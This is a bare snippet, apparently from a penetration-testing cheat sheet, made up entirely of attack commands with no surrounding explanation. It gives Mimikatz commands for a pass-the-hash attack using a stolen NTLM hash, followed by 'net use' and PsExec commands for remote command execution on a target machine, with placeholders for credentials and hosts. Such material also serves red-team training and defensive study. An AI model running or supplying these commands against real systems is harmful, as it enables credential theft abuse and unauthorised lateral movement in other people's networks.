```powershell
privilege::debug
sekurlsa::pth /user:$USERNAME /domain:$DOMAIN /ntlm:$HASH /run:$COMMAND
```

```powershell
net use \\$TARGET
.\PsExec.exe -accepteula \\$TARGET cmd # SysInternals
```

